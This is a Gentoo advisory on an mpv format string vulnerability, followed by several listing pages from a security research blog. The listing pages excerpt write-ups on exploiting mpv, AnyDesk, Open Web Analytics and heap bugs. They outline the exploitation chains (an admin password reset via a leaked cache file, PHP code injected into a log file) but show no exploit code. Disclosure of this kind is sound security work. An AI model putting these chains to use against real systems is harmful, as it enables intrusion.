=== Content from security.gentoo.org_7aa9418b_20250114_184646.html ===

[![Gentoo](https://assets.gentoo.org/tyrian/v2/site-logo.png)](/ "Back to the homepage")
Security

[**Get Gentoo!**](https://get.gentoo.org/)
gentoo.org sites
[gentoo.org](https://www.gentoo.org/ "Main Gentoo website")
[Wiki](https://wiki.gentoo.org/ "Find and contribute documentation")
[Bugs](https://bugs.gentoo.org/ "Report issues and find common issues")
[Forums](https://forums.gentoo.org/ "Discuss with the community")
[Packages](https://packages.gentoo.org/ "Find software for your Gentoo")

[Planet](https://planet.gentoo.org/ "Find out what's going on in the developer community")
[Archives](https://archives.gentoo.org/ "Read up on past discussions")
[Sources](https://sources.gentoo.org/ "Browse our source code")

[Infra Status](https://infra-status.gentoo.org/ "Get updates on the services provided by Gentoo")

* [Home](/)
* [Stay informed](/subscribe)
* [Advisories](/glsa)

# mpv: Format string vulnerability — GLSA **202107-46**

A format string vulnerability was found in mpv, potentially
resulting in arbitrary code execution.

### Affected packages

| Package | **media-video/mpv** on all architectures |
| --- | --- |
| Affected versions | < **0.33.1** |
| Unaffected versions | >= **0.33.1** |

### Background

Video player based on MPlayer/mplayer2.

### Description

mpv uses untrusted input within format strings.

### Impact

A remote attacker could entice a user to open a specially crafted m3u
playlist file using mpv, possibly resulting in execution of arbitrary
code with the privileges of the process or a Denial of Service condition.

### Workaround

There is no known workaround at this time.

### Resolution

All mpv users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=media-video/mpv-0.33.1"

```
### References

* [CVE-2021-30145](https://nvd.nist.gov/vuln/detail/CVE-2021-30145)

**Release date**

July 20, 2021

**Latest revision**

July 20, 2021: 1

**Severity**

normal

**Exploitable**

remote

**Bugzilla entries**

* [780474](https://bugs.gentoo.org/show_bug.cgi?id=780474)

### Questions or comments?

Please feel free to contact us.

**© 2001–2020 Gentoo Foundation, Inc.**



=== Content from devel0pment.de_d26c8aba_20250115_113124.html ===

[Skip to content](#content)
![](https://devel0pment.de/wp-content/uploads/2018/03/cropped-dev_05.png)

[devel0pment.de](https://devel0pment.de/)

software, offensive security research

# Category: article

Posted on [18. March 202221. March 2022](https://devel0pment.de/?p=2494)
## [From Single / Double Quote Confusion To RCE (CVE-2022-24637)](https://devel0pment.de/?p=2494)

[Open Web Analytics (OWA)](https://www.openwebanalytics.com/) is an open-source alternative to Google Analytics. OWA is written in PHP and can be hosted on an own server. Version 1.7.3 suffers from two vulnerabilities, which can be exploited by an unauthenticated attacker to gain RCE, when chained together.

The cause of the first vulnerability ([CVE-2022-24637](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-24637)) is a single quote / double quote confusion, which leads to an information disclosure. The header of an automatically generated PHP cache file containing sensitive information is defined as '<?php\n…' instead of "<?php\n…". This leads to a literal backslash and n character being written instead of a newline character resulting in a broken PHP tag. Because of this the file is not interpreted as PHP code, but delivered in plain leaking sensitive cache information. This information can be leveraged to set a new password for the admin user.

The second vulnerability is a PHP file write, which requires admin privileges. The internal settings for the logfile path as well as the log level can be changed by manually crafting a POST request. This way the logfile can be set to a PHP file. By also increasing the log level and generating an event with attacker controlled data, PHP code can be injected into this logfile. This results in the possibility to execute arbitrary PHP code.

I would like to thank Peter Adams, the creator and maintainer of OWA who released a patch for the issue only one day after my initial notification. I was really amazed by the quick and professional reaction. There are security issues in each and every software, but the difference is how these are dealt with.

– [Introduction](https://devel0pment.de/?p=2494#intro)

– [Single / Double Quote Confusion](https://devel0pment.de/?p=2494#vuln1)

– [PHP file write](https://devel0pment.de/?p=2494#vuln2)

– [Demonstration](https://devel0pment.de/?p=2494#demo)

– [Patch and Mitigations](https://devel0pment.de/?p=2494#patch)

– [Conclusion](https://devel0pment.de/?p=2494#con)
[Continue reading “From Single / Double Quote Confusion To RCE (CVE-2022-24637)”](https://devel0pment.de/?p=2494#more-2494)

Posted on [12. April 202113. April 2021](https://devel0pment.de/?p=2217)
## [mpv media player – mf custom protocol vulnerability (CVE-2021-30145)](https://devel0pment.de/?p=2217)

![](https://devel0pment.de/wp-content/uploads/2021/04/mpv_title.png)

The [mpv](https://mpv.io/) media player provides a custom protocol handler (mf://) in order to merge multiple images to a video. An undocumented feature within this protocol handler allows the usage of a format specifier in the provided URL, which is evaluated using sprintf. This results in both, a format string vulnerability as well as a heap overflow ([CVE-2021-30145](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-30145)).

After disclosing the vulnerability to the mpv team on the 3rd April 2021 I got an immediate response. The mpv team took the issue very seriously and immediately started to work on a patch with me. This was the first time I disclosed a vulnerability to an open source project and I was really impressed about the professional reaction and the passionate commitment. The patch was released only two days after my report on the 5th April 2021 ([commit](https://github.com/mpv-player/mpv/commit/d0c530919d8cd4d7a774e38ab064e0fabdae34e6)). Thanks a lot to avih, sfan5 and jeeb.

The impact of the format string vulnerability is limited on Linux, because the binary is compiled with FORTIFY\_SOURCE by default. Though the heap overflow can be used to gain arbitrary code execution by overflowing into an adjacent heap chunk and setting a function pointer to an attacker controlled value. Nevertheless I estimate the probability of exploitation in real life as quite low, because a victim has to be tricked into opening a malicious playlist (e.g. via a URL like http://10.0.0.1/evil.m3u) and the attacker has to have detailed information about the victim’s system to fine-tune the exploit.

Within this article I describe the vulnerability itself as well as the development of a proof of concept exploit for Ubuntu 20.04.2 LTS with ASLR disabled. At the end of the article I outline a few thoughts on how ASLR can be bypassed and what changes if we develop an exploit for Windows. The article is divided into the following sections:

– [Introduction](https://devel0pment.de/?p=2217#intro)

– [Format String Vulnerability](https://devel0pment.de/?p=2217#format)

– [Heap Overflow](https://devel0pment.de/?p=2217#hoverflow)

– [Exploitation](https://devel0pment.de/?p=2217#expl)

– [Further Thoughts](https://devel0pment.de/?p=2217#ft)

– [Conclusion](https://devel0pment.de/?p=2217#con)

[Continue reading “mpv media player – mf custom protocol vulnerability (CVE-2021-30145)”](https://devel0pment.de/?p=2217#more-2217)

Posted on [9. June 202015. June 2020](https://devel0pment.de/?p=1881)
## [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881)

![](https://devel0pment.de/wp-content/uploads/2020/06/cve.png)

One of my goals for this year is to spend a little bit more of my spare time on real world applications. Doing so I took a look at the remote desktop application [AnyDesk](https://anydesk.com/), which seems to quickly raise in popularity not only because of COVID-19. AnyDesk is available for a variety of operating systems including Windows, Linux, Android and iOS. By reversing and fuzzing the Linux version 5.5.2 of the application I was able to find a format string vulnerability, which can be used to gain Remote Code Execution (RCE) by sending a single UDP packet to the target machine. AnyDesk took the issue very seriously. They released a patch only three days after my notification (5.5.3) and paid me a bounty of 5.000 EUR. The vulnerability is tracked as [CVE-2020-13160](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-13160). Within this article I want to share all steps, which were involved in finding the vulnerability, understanding the bug and developing the RCE exploit. The article is divided into the following sections:

→ [Fuzzing](https://devel0pment.de/?p=1881#fuzzing)

→ [Bug](https://devel0pment.de/?p=1881#bug)

→ [Exploit](https://devel0pment.de/?p=1881#exploit)

    – [Strategy](https://devel0pment.de/?p=1881#strategy)

    – [The v in vsnprintf](https://devel0pment.de/?p=1881#vsnprintf)

    – [Gaining arbitrary write](https://devel0pment.de/?p=1881#write)

    – [Controlling the instruction pointer](https://devel0pment.de/?p=1881#ip)

    – [Hitting our shellcode: dynamic field width](https://devel0pment.de/?p=1881#shellcode)

    – [Final exploit](https://devel0pment.de/?p=1881#final)

→ [Conclusion](https://devel0pment.de/?p=1881#conclusion)

[Continue reading “AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)”](https://devel0pment.de/?p=1881#more-1881)

Posted on [14. August 201814. August 2018](https://devel0pment.de/?p=688)
## [Heap Exploitation: Off-By-One / Poison Null Byte](https://devel0pment.de/?p=688)

![](https://devel0pment.de/wp-content/uploads/2018/08/poison_null.png)

The goal of this article is to explain in detail how an off-by-one vulnerability on the heap also known as *poison null byte* can be exploited. Although this technique does not work with the latest libc, I think it can be used very good in order to demonstrate how exploits based on heap-metadata corruption work (also check out [shellphish’s how2heap](https://github.com/shellphish/how2heap)).

In order to do this I created a vulnerable program, which we will use as an example to create such an exploit. If you like to, you can start by analyzing and exploiting the program on your own (at least check out [Environment](https://devel0pment.de/?p=688#env)):

–> [heap.zip](https://devel0pment.de/wp-content/uploads/2018/08/heap.zip)

Though it is not required to the exploit the program, the source-code might be helpful:

–> [heap.c](https://devel0pment.de/wp-content/uploads/2018/08/heap.c)

The article is divided into the following sections:

–> [Environment](https://devel0pment.de/?p=688#env)

–> [Vulnerable Program](https://devel0pment.de/?p=688#vuln)

–> [Heap Basics](https://devel0pment.de/?p=688#basic)

–> [Libc-Leak](https://devel0pment.de/?p=688#libc)

–> [Control Instruction Pointer](https://devel0pment.de/?p=688#rip)

–> [One Gadget](https://devel0pment.de/?p=688#oneg)

–> [Final Exploit](https://devel0pment.de/?p=688#final)

[Continue reading “Heap Exploitation: Off-By-One / Poison Null Byte”](https://devel0pment.de/?p=688#more-688)

Search for:

Search

## Pages

* [About](https://devel0pment.de/?page_id=2665)
* [Contact](https://devel0pment.de/?page_id=2)

## Recent Posts

* [Hack The Box – Response](https://devel0pment.de/?p=2594)
* [From Single / Double Quote Confusion To RCE (CVE-2022-24637)](https://devel0pment.de/?p=2494)
* [ASIS CTF Quals 2021 – ASCII art a a service](https://devel0pment.de/?p=2431)
* [Hacky Easter 2021 writeup](https://devel0pment.de/?p=2282)
* [mpv media player – mf custom protocol vulnerability (CVE-2021-30145)](https://devel0pment.de/?p=2217)
## Recent Comments

* scryh on [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881#comment-4174)
* [m3dsec](https://m3dsec.github.io/) on [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881#comment-4173)
* [TobjasR](https://www.linkedin.com/in/tobjasr/) on [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881#comment-3704)
* scryh on [RPISEC/MBE: writeup lab07 (Heap Exploitation)](https://devel0pment.de/?p=386#comment-3411)
* Tomer on [RPISEC/MBE: writeup lab07 (Heap Exploitation)](https://devel0pment.de/?p=386#comment-3408)
## Archives

* [February 2023](https://devel0pment.de/?m=202302)
* [March 2022](https://devel0pment.de/?m=202203)
* [October 2021](https://devel0pment.de/?m=202110)
* [May 2021](https://devel0pment.de/?m=202105)
* [April 2021](https://devel0pment.de/?m=202104)
* [January 2021](https://devel0pment.de/?m=202101)
* [September 2020](https://devel0pment.de/?m=202009)
* [June 2020](https://devel0pment.de/?m=202006)
* [May 2020](https://devel0pment.de/?m=202005)
* [January 2020](https://devel0pment.de/?m=202001)
* [July 2019](https://devel0pment.de/?m=201907)
* [June 2019](https://devel0pment.de/?m=201906)
* [March 2019](https://devel0pment.de/?m=201903)
* [February 2019](https://devel0pment.de/?m=201902)
* [January 2019](https://devel0pment.de/?m=201901)
* [August 2018](https://devel0pment.de/?m=201808)
* [July 2018](https://devel0pment.de/?m=201807)
* [May 2018](https://devel0pment.de/?m=201805)
* [March 2018](https://devel0pment.de/?m=201803)
* [February 2018](https://devel0pment.de/?m=201802)
* [January 2018](https://devel0pment.de/?m=201801)
## Categories

* [article](https://devel0pment.de/?cat=29)
* [ctf](https://devel0pment.de/?cat=24)
* [Hack The Box](https://devel0pment.de/?cat=32)
* [Hacking-Lab.com](https://devel0pment.de/?cat=25)
* [RPISEC/MBE](https://devel0pment.de/?cat=26)
* [writeup](https://devel0pment.de/?cat=7)
## Meta

* [Log in](https://devel0pment.de/wp-login.php)
* [Entries feed](https://devel0pment.de/?feed=rss2)
* [Comments feed](https://devel0pment.de/?feed=comments-rss2)
* [WordPress.org](https://wordpress.org/)

[Proudly powered by WordPress](https://wordpress.org/)

We use cookies to ensure that we give you the best experience on our website. If you continue to use this site we will assume that you are happy with it.OkNo



=== Content from devel0pment.de_0ba4edcc_20250115_113126.html ===

[Skip to content](#content)
![](https://devel0pment.de/wp-content/uploads/2018/03/cropped-dev_05.png)

[devel0pment.de](https://devel0pment.de/)

software, offensive security research

# Tag: heap

Posted on [12. April 202113. April 2021](https://devel0pment.de/?p=2217)
## [mpv media player – mf custom protocol vulnerability (CVE-2021-30145)](https://devel0pment.de/?p=2217)

![](https://devel0pment.de/wp-content/uploads/2021/04/mpv_title.png)

The [mpv](https://mpv.io/) media player provides a custom protocol handler (mf://) in order to merge multiple images to a video. An undocumented feature within this protocol handler allows the usage of a format specifier in the provided URL, which is evaluated using sprintf. This results in both, a format string vulnerability as well as a heap overflow ([CVE-2021-30145](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-30145)).

After disclosing the vulnerability to the mpv team on the 3rd April 2021 I got an immediate response. The mpv team took the issue very seriously and immediately started to work on a patch with me. This was the first time I disclosed a vulnerability to an open source project and I was really impressed about the professional reaction and the passionate commitment. The patch was released only two days after my report on the 5th April 2021 ([commit](https://github.com/mpv-player/mpv/commit/d0c530919d8cd4d7a774e38ab064e0fabdae34e6)). Thanks a lot to avih, sfan5 and jeeb.

The impact of the format string vulnerability is limited on Linux, because the binary is compiled with FORTIFY\_SOURCE by default. Though the heap overflow can be used to gain arbitrary code execution by overflowing into an adjacent heap chunk and setting a function pointer to an attacker controlled value. Nevertheless I estimate the probability of exploitation in real life as quite low, because a victim has to be tricked into opening a malicious playlist (e.g. via a URL like http://10.0.0.1/evil.m3u) and the attacker has to have detailed information about the victim’s system to fine-tune the exploit.

Within this article I describe the vulnerability itself as well as the development of a proof of concept exploit for Ubuntu 20.04.2 LTS with ASLR disabled. At the end of the article I outline a few thoughts on how ASLR can be bypassed and what changes if we develop an exploit for Windows. The article is divided into the following sections:

– [Introduction](https://devel0pment.de/?p=2217#intro)

– [Format String Vulnerability](https://devel0pment.de/?p=2217#format)

– [Heap Overflow](https://devel0pment.de/?p=2217#hoverflow)

– [Exploitation](https://devel0pment.de/?p=2217#expl)

– [Further Thoughts](https://devel0pment.de/?p=2217#ft)

– [Conclusion](https://devel0pment.de/?p=2217#con)

[Continue reading “mpv media player – mf custom protocol vulnerability (CVE-2021-30145)”](https://devel0pment.de/?p=2217#more-2217)

Posted on [14. August 201814. August 2018](https://devel0pment.de/?p=688)
## [Heap Exploitation: Off-By-One / Poison Null Byte](https://devel0pment.de/?p=688)

![](https://devel0pment.de/wp-content/uploads/2018/08/poison_null.png)

The goal of this article is to explain in detail how an off-by-one vulnerability on the heap also known as *poison null byte* can be exploited. Although this technique does not work with the latest libc, I think it can be used very good in order to demonstrate how exploits based on heap-metadata corruption work (also check out [shellphish’s how2heap](https://github.com/shellphish/how2heap)).

In order to do this I created a vulnerable program, which we will use as an example to create such an exploit. If you like to, you can start by analyzing and exploiting the program on your own (at least check out [Environment](https://devel0pment.de/?p=688#env)):

–> [heap.zip](https://devel0pment.de/wp-content/uploads/2018/08/heap.zip)

Though it is not required to the exploit the program, the source-code might be helpful:

–> [heap.c](https://devel0pment.de/wp-content/uploads/2018/08/heap.c)

The article is divided into the following sections:

–> [Environment](https://devel0pment.de/?p=688#env)

–> [Vulnerable Program](https://devel0pment.de/?p=688#vuln)

–> [Heap Basics](https://devel0pment.de/?p=688#basic)

–> [Libc-Leak](https://devel0pment.de/?p=688#libc)

–> [Control Instruction Pointer](https://devel0pment.de/?p=688#rip)

–> [One Gadget](https://devel0pment.de/?p=688#oneg)

–> [Final Exploit](https://devel0pment.de/?p=688#final)

[Continue reading “Heap Exploitation: Off-By-One / Poison Null Byte”](https://devel0pment.de/?p=688#more-688)

Search for:

Search

## Pages

* [About](https://devel0pment.de/?page_id=2665)
* [Contact](https://devel0pment.de/?page_id=2)

## Recent Posts

* [Hack The Box – Response](https://devel0pment.de/?p=2594)
* [From Single / Double Quote Confusion To RCE (CVE-2022-24637)](https://devel0pment.de/?p=2494)
* [ASIS CTF Quals 2021 – ASCII art a a service](https://devel0pment.de/?p=2431)
* [Hacky Easter 2021 writeup](https://devel0pment.de/?p=2282)
* [mpv media player – mf custom protocol vulnerability (CVE-2021-30145)](https://devel0pment.de/?p=2217)
## Recent Comments

* scryh on [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881#comment-4174)
* [m3dsec](https://m3dsec.github.io/) on [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881#comment-4173)
* [TobjasR](https://www.linkedin.com/in/tobjasr/) on [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881#comment-3704)
* scryh on [RPISEC/MBE: writeup lab07 (Heap Exploitation)](https://devel0pment.de/?p=386#comment-3411)
* Tomer on [RPISEC/MBE: writeup lab07 (Heap Exploitation)](https://devel0pment.de/?p=386#comment-3408)
## Archives

* [February 2023](https://devel0pment.de/?m=202302)
* [March 2022](https://devel0pment.de/?m=202203)
* [October 2021](https://devel0pment.de/?m=202110)
* [May 2021](https://devel0pment.de/?m=202105)
* [April 2021](https://devel0pment.de/?m=202104)
* [January 2021](https://devel0pment.de/?m=202101)
* [September 2020](https://devel0pment.de/?m=202009)
* [June 2020](https://devel0pment.de/?m=202006)
* [May 2020](https://devel0pment.de/?m=202005)
* [January 2020](https://devel0pment.de/?m=202001)
* [July 2019](https://devel0pment.de/?m=201907)
* [June 2019](https://devel0pment.de/?m=201906)
* [March 2019](https://devel0pment.de/?m=201903)
* [February 2019](https://devel0pment.de/?m=201902)
* [January 2019](https://devel0pment.de/?m=201901)
* [August 2018](https://devel0pment.de/?m=201808)
* [July 2018](https://devel0pment.de/?m=201807)
* [May 2018](https://devel0pment.de/?m=201805)
* [March 2018](https://devel0pment.de/?m=201803)
* [February 2018](https://devel0pment.de/?m=201802)
* [January 2018](https://devel0pment.de/?m=201801)
## Categories

* [article](https://devel0pment.de/?cat=29)
* [ctf](https://devel0pment.de/?cat=24)
* [Hack The Box](https://devel0pment.de/?cat=32)
* [Hacking-Lab.com](https://devel0pment.de/?cat=25)
* [RPISEC/MBE](https://devel0pment.de/?cat=26)
* [writeup](https://devel0pment.de/?cat=7)
## Meta

* [Log in](https://devel0pment.de/wp-login.php)
* [Entries feed](https://devel0pment.de/?feed=rss2)
* [Comments feed](https://devel0pment.de/?feed=comments-rss2)
* [WordPress.org](https://wordpress.org/)

[Proudly powered by WordPress](https://wordpress.org/)

We use cookies to ensure that we give you the best experience on our website. If you continue to use this site we will assume that you are happy with it.OkNo



=== Content from devel0pment.de_b5a72663_20250115_113126.html ===

[Skip to content](#content)
![](https://devel0pment.de/wp-content/uploads/2018/03/cropped-dev_05.png)

[devel0pment.de](https://devel0pment.de/)

software, offensive security research

# Tag: x64

Posted on [13. May 202113. May 2021](https://devel0pment.de/?p=2282)
## [Hacky Easter 2021 writeup](https://devel0pment.de/?p=2282)

![](https://devel0pment.de/wp-content/uploads/2021/04/he21_title.png)

HackyEaster was awesome again. From a technical point of view there weren’t too much new things, but the creativity of the provided challenges made it really fun. Including the little teaser challenge there were a total amount of 37 challenges. These challenges were divided into different levels. You could only proceed to the next level, if you have earned enough points in the current level. I really liked that new idea.

[Continue reading “Hacky Easter 2021 writeup”](https://devel0pment.de/?p=2282#more-2282)

Posted on [12. April 202113. April 2021](https://devel0pment.de/?p=2217)
## [mpv media player – mf custom protocol vulnerability (CVE-2021-30145)](https://devel0pment.de/?p=2217)

![](https://devel0pment.de/wp-content/uploads/2021/04/mpv_title.png)

The [mpv](https://mpv.io/) media player provides a custom protocol handler (mf://) in order to merge multiple images to a video. An undocumented feature within this protocol handler allows the usage of a format specifier in the provided URL, which is evaluated using sprintf. This results in both, a format string vulnerability as well as a heap overflow ([CVE-2021-30145](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-30145)).

After disclosing the vulnerability to the mpv team on the 3rd April 2021 I got an immediate response. The mpv team took the issue very seriously and immediately started to work on a patch with me. This was the first time I disclosed a vulnerability to an open source project and I was really impressed about the professional reaction and the passionate commitment. The patch was released only two days after my report on the 5th April 2021 ([commit](https://github.com/mpv-player/mpv/commit/d0c530919d8cd4d7a774e38ab064e0fabdae34e6)). Thanks a lot to avih, sfan5 and jeeb.

The impact of the format string vulnerability is limited on Linux, because the binary is compiled with FORTIFY\_SOURCE by default. Though the heap overflow can be used to gain arbitrary code execution by overflowing into an adjacent heap chunk and setting a function pointer to an attacker controlled value. Nevertheless I estimate the probability of exploitation in real life as quite low, because a victim has to be tricked into opening a malicious playlist (e.g. via a URL like http://10.0.0.1/evil.m3u) and the attacker has to have detailed information about the victim’s system to fine-tune the exploit.

Within this article I describe the vulnerability itself as well as the development of a proof of concept exploit for Ubuntu 20.04.2 LTS with ASLR disabled. At the end of the article I outline a few thoughts on how ASLR can be bypassed and what changes if we develop an exploit for Windows. The article is divided into the following sections:

– [Introduction](https://devel0pment.de/?p=2217#intro)

– [Format String Vulnerability](https://devel0pment.de/?p=2217#format)

– [Heap Overflow](https://devel0pment.de/?p=2217#hoverflow)

– [Exploitation](https://devel0pment.de/?p=2217#expl)

– [Further Thoughts](https://devel0pment.de/?p=2217#ft)

– [Conclusion](https://devel0pment.de/?p=2217#con)

[Continue reading “mpv media player – mf custom protocol vulnerability (CVE-2021-30145)”](https://devel0pment.de/?p=2217#more-2217)

Posted on [1. January 202124. January 2021](https://devel0pment.de/?p=2084)
## [HACKvent20 writeup](https://devel0pment.de/?p=2084)

|  | This year’s [HACKvent](https://hacking-lab.com) hosted on [competition.hacking-lab.com](https://competition.hacking-lab.com) has been as great as every year.There was a total amount of 28 awesome challenges with varying difficulties. |
| --- | --- |

| |  | [HV20.(-1) Twelve steps of christmas](?p=2084#_1) | | --- | --- | |  | [HV20.01 Happy HACKvent 2020](?p=2084#01) | |  | [HV20.02 Chinese Animals](?p=2084#02) | |  | [HV20.03 Packed gifts](?p=2084#03) | |  | [HV20.04 Br❤celet](?p=2084#04) | |  | [HV20.05 Image DNA](?p=2084#05) | | |  | [HV20.13 Twelve steps of christmas](?p=2084#13) | | --- | --- | |  | [HV20.14 Santa’s Special GIFt](?p=2084#14) | |  | [HV20.15 Man Commands, Server Lost](?p=2084#15) | |  | [HV20.16 Naughty Rudolph](?p=2084#16) | |  | [HV20.17 Santa’s Gift Factory Control](?p=2084#17) | |  | [HV20.18 Santa’s lost home](?p=2084#18) | |  | [HV20.19 Docker Linter Service](?p=2084#19) | |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| |  | [HV20.06 Twelve steps of christmas](?p=2084#06) | | --- | --- | |  | [HV20.07 Bad morals](?p=2084#07) | |  | [HV20.08 The game](?p=2084#08) | |  | [HV20.09 Santa’s Gingerbread Factory](?p=2084#09) | |  | [HV20.10 Be patient with the adjacent](?p=2084#10) | |  | [HV20.11 Chris’mas carol](?p=2084#11) | |  | [HV20.12 Wiener waltz](?p=2084#12) | | |  | [HV20.20 Twelve steps of Christmas](?p=2084#20) | | --- | --- | |  | [HV20.21 Threatened Cat](?p=2084#21) | |  | [HV20.22 Padawanlock](?p=2084#22) | |  | [HV20.23 Those who make backups are cowards!](?p=2084#23) | |  | [HV20.24 Santa’s Secure Data Storage](?p=2084#24) | |  | [HV20.H1 It’s a secret!](?p=2084#h1) | |  | [HV20.H2 Oh, another secret!](?p=2084#h2) | |  | [HV20.H3 Hidden in Plain Sight](?p=2084#h3) | |

[Continue reading “HACKvent20 writeup”](https://devel0pment.de/?p=2084#more-2084)

Posted on [1. January 20201. January 2020](https://devel0pment.de/?p=1663)
## [HACKvent19 writeup](https://devel0pment.de/?p=1663)

|  | This year’s **HACKvent** was hosted on the brand new [Hacking-Lab 2.0](https://academy.hacking-lab.com/) plattform. Each day from the 1st of december until the 24th a new challenge is published raising in difficulty. The flag format changed from `HV18-xxxx-xxxx-xxxx-xxxx-xxxx` to `HV19{...}`. After all I managed to solve all 28 challenges 🙂 |
| --- | --- |

|  | Hidden |
| --- | --- |
| [**HV19.H1** Hidden One](https://devel0pment.de/?p=1663#chlgHV19.H1)[**HV19.H2** Hidden Two](https://devel0pment.de/?p=1663#chlgHV19.H2)[**HV19.H3** Hidden Three](https://devel0pment.de/?p=1663#chlgHV19.H3)[**HV19.H4** Hidden Four](https://devel0pment.de/?p=1663#chlgHV19.H4) | |
|  | Easy |
| [**HV19.01** censored](https://devel0pment.de/?p=1663#chlgHV19.01)[**HV19.02** Triangulation](https://devel0pment.de/?p=1663#chlgHV19.02)[**HV19.03** Hodor, Hodor, Hodor](https://devel0pment.de/?p=1663#chlgHV19.03)[**HV19.04** password policy circumvention](https://devel0pment.de/?p=1663#chlgHV19.04)[**HV19.05** Santa Parcel Tracking](https://devel0pment.de/?p=1663#chlgHV19.05)[**HV19.06** bacon and eggs](https://devel0pment.de/?p=1663#chlgHV19.06)[**HV19.07** Santa Rider](https://devel0pment.de/?p=1663#chlgHV19.07) | |
|  | Medium |
| [**HV19.08** SmileNcryptor 4.0](https://devel0pment.de/?p=1663#chlgHV19.08)[**HV19.09** Santas Quick Response 3.0](https://devel0pment.de/?p=1663#chlgHV19.09)[**HV19.10** Guess what](https://devel0pment.de/?p=1663#chlgHV19.10)[**HV19.11** Frolicsome Santa Jokes API](https://devel0pment.de/?p=1663#chlgHV19.11)[**HV19.12** back to basic](https://devel0pment.de/?p=1663#chlgHV19.12)[**HV19.13** TrieMe](https://devel0pment.de/?p=1663#chlgHV19.13)[**HV19.14** Achtung das Flag](https://devel0pment.de/?p=1663#chlgHV19.14) | |
|  | Hard |
| [**HV19.15** Santa’s Workshop](https://devel0pment.de/?p=1663#chlgHV19.15)[**HV19.16** B0rked Calculator](https://devel0pment.de/?p=1663#chlgHV19.16)[**HV19.17** Unicode Portal](https://devel0pment.de/?p=1663#chlgHV19.17)[**HV19.18** Dance with me](https://devel0pment.de/?p=1663#chlgHV19.18)[**HV19.19** U+1F385](https://devel0pment.de/?p=1663#chlgHV19.19)[**HV19.20** i want to play a game](https://devel0pment.de/?p=1663#chlgHV19.20)[**HV19.21** Happy Christmas 256](https://devel0pment.de/?p=1663#chlgHV19.21) | |
|  | Leet |
| [**HV19.22** The command … is lost](https://devel0pment.de/?p=1663#chlgHV19.22)[**HV19.23** Internet Data Archive](https://devel0pment.de/?p=1663#chlgHV19.23)[**HV19.24** ham radio](https://devel0pment.de/?p=1663#chlgHV19.24) | |

[Continue reading “HACKvent19 writeup”](https://devel0pment.de/?p=1663#more-1663)

Posted on [12. June 201912. June 2019](https://devel0pment.de/?p=1528)
## [Hacky Easter 2019 writeup](https://devel0pment.de/?p=1528)

|  | As every year [hacking-lab.com](https://www.hacking-lab.com/index.html) carried out the annual **Hacky Easter** event with 27 challenges. As usual the variety of the challenges was awesome. I actually got full score this year 🙂 Many thanks to [daubsi](https://twitter.com/daubsi), who gave me a nudge once in a while on the last challenges (you can find his writeup [here](https://github.com/OevreFlataeker/hackyeaster19_writeup)). |
| --- | --- |

|  | Easy |
| --- | --- |
| [**01** Twisted](https://devel0pment.de/?p=1528#chlg01) [**02** Just Watch](https://devel0pment.de/?p=1528#chlg02) [**03** Sloppy Encryption](https://devel0pment.de/?p=1528#chlg03) [**04** Disco 2](https://devel0pment.de/?p=1528#chlg04) [**05** Call for Papers](https://devel0pment.de/?p=1528#chlg05) [**06** Dots](https://devel0pment.de/?p=1528#chlg06) [**07** Shell we Argument](https://devel0pment.de/?p=1528#chlg07) [**08** Modern Art](https://devel0pment.de/?p=1528#chlg08) [**09** rorriM rorriM](https://devel0pment.de/?p=1528#chlg09) | |
|  | Medium |
| [**10** Stackunderflow](https://devel0pment.de/?p=1528#chlg10) [**11** Memeory 2.0](https://devel0pment.de/?p=1528#chlg11) [**12** Decrypt0r](https://devel0pment.de/?p=1528#chlg12) [**13** Symphony in HEX](https://devel0pment.de/?p=1528#chlg13) [**14** White Box](https://devel0pment.de/?p=1528#chlg14) [**15** Seen in Steem](https://devel0pment.de/?p=1528#chlg15) [**16** Every-Thing](https://devel0pment.de/?p=1528#chlg16) [**17** New Egg Design](https://devel0pment.de/?p=1528#chlg17) [**18** Egg Storage](https://devel0pment.de/?p=1528#chlg18) | |
|  | Hard |
| [**19** CoUmpact DiAsc](https://devel0pment.de/?p=1528#chlg19) [**20** Scrambled Egg](https://devel0pment.de/?p=1528#chlg20) [**21** The Hunt: Misty Jungle](https://devel0pment.de/?p=1528#chlg21) [**22** The Hunt: Muddy Quagmire](https://devel0pment.de/?p=1528#chlg22) [**23** The Maze](https://devel0pment.de/?p=1528#chlg23) [**24** CAPTEG](https://devel0pment.de/?p=1528#chlg24) | |
|  | Hidden |
| [**25** Hidden Egg #1](https://devel0pment.de/?p=1528#chlg25) [**26** Hidden Egg #2](https://devel0pment.de/?p=1528#chlg26) [**27** Hidden Egg #3](https://devel0pment.de/?p=1528#chlg27) | |

[Continue reading “Hacky Easter 2019 writeup”](https://devel0pment.de/?p=1528#more-1528)

Posted on [3. February 20193. February 2019](https://devel0pment.de/?p=1191)
## [nullcon HackIM 2019 – babypwn](https://devel0pment.de/?p=1191)

The [nullcon HackIM 2019 CTF](https://ctf.nullcon.net/) ([ctftime.org](https://ctftime.org/event/741)) ran from 01/02/2019, 16:30 UTC to 03/02/2019 04:30 UTC.

I did the pwn challenge *babypwn*, which was really fun to do. The following article contains my writeup being divided into the following sections:

→ [Challenge description](https://devel0pment.de/?p=1191#chlg)
→ [Security mechanisms and disassembly](https://devel0pment.de/?p=1191#disass)
→ [Signedness vulnerabilitiy](https://devel0pment.de/?p=1191#signed)
→ [Format string vulnerabilitiy](https://devel0pment.de/?p=1191#format)
→ [Final exploit](https://devel0pment.de/?p=1191#final)

